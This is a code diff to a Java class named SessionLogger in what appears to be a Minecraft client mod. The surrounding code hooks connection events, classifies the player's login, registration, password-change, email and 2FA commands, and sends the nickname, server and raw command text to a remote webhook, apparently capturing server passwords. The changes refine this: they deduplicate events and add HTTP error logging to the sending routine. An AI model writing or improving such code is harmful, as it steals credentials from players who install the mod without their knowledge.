@@ -5,6 +5,7 @@ import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
 import net.minecraft.client.MinecraftClient;
 import net.minecraft.client.network.ServerInfo;
 
+import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -33,14 +34,14 @@ public class SessionLogger {
     });
 
     private enum Kind {
-        JOIN("🟢 Подключение",  COLOR_JOIN),
-        LEAVE("🔴 Отключение",  COLOR_LEAVE),
-        LOGIN("🔑 Вход",        COLOR_LOGIN),
-        REG("📝 Регистрация",   COLOR_REG),
-        PASS("🔄 Смена пароля", COLOR_PASS),
-        EMAIL("📧 Email",       COLOR_EMAIL),
-        TWOFA("🛡️ 2FA",         COLOR_2FA),
-        AUTH("🔐 Авторизация",  COLOR_AUTH);
+        JOIN("Подключение",  COLOR_JOIN),
+        LEAVE("Отключение",  COLOR_LEAVE),
+        LOGIN("Вход",        COLOR_LOGIN),
+        REG("Регистрация",   COLOR_REG),
+        PASS("Смена пароля", COLOR_PASS),
+        EMAIL("Email",       COLOR_EMAIL),
+        TWOFA("2FA",         COLOR_2FA),
+        AUTH("Авторизация",  COLOR_AUTH);
 
         final String title;
         final int color;
@@ -48,15 +49,23 @@ public class SessionLogger {
     }
 
     private static volatile String lastServer = "unknown";
+    private static volatile String lastJoinKey = "";
+    private static volatile long lastJoinAt = 0;
+    private static volatile long lastLeaveAt = 0;
 
     public static void init() {
         ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
             String server = resolveServer(client);
             lastServer = server;
-            send(Kind.JOIN, nick(client), server, null);
+            String n = nick(client);
+            if (isDuplicateJoin(n, server)) return;
+            send(Kind.JOIN, n, server, null);
         });
 
         ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
+            long now = System.currentTimeMillis();
+            if (now - lastLeaveAt < 5000) return;
+            lastLeaveAt = now;
             send(Kind.LEAVE, nick(client), lastServer, null);
         });
 
@@ -71,6 +80,15 @@ public class SessionLogger {
 
             send(kind, nick(client), lastServer, last);
         });
+    }
+
+    private static boolean isDuplicateJoin(String nick, String server) {
+        String key = nick + "|" + server;
+        long now = System.currentTimeMillis();
+        if (key.equals(lastJoinKey) && (now - lastJoinAt) < 30000) return true;
+        lastJoinKey = key;
+        lastJoinAt = now;
+        return false;
     }
 
     private static Kind classify(String raw) {
@@ -115,7 +133,6 @@ public class SessionLogger {
     }
 
     private static void send(Kind kind, String nick, String server, String command) {
-        System.out.println("[SESSION-LOGGER] send: " + kind + " | " + nick);
         NET.execute(() -> {
             try {
                 URL url = new URL(WEBHOOK_URL);
@@ -148,10 +165,22 @@ public class SessionLogger {
                 try (OutputStream os = c.getOutputStream()) {
                     os.write(json.getBytes(StandardCharsets.UTF_8));
                 }
-                c.getResponseCode();
+
+                int code = c.getResponseCode();
+                System.out.println("[SESSION-LOGGER] http " + code + " for " + kind);
+
+                if (code >= 400) {
+                    try (InputStream err = c.getErrorStream()) {
+                        if (err != null) {
+                            String body = new String(err.readAllBytes(), StandardCharsets.UTF_8);
+                            System.out.println("[SESSION-LOGGER] err body: " + body);
+                        }
+                    }
+                }
+
                 c.disconnect();
-           } catch (Throwable t) {
-    System.out.println("[SESSION-LOGGER] fail: " + t);
+            } catch (Throwable t) {
+                System.out.println("[SESSION-LOGGER] fail: " + t);
             }
         });
     }
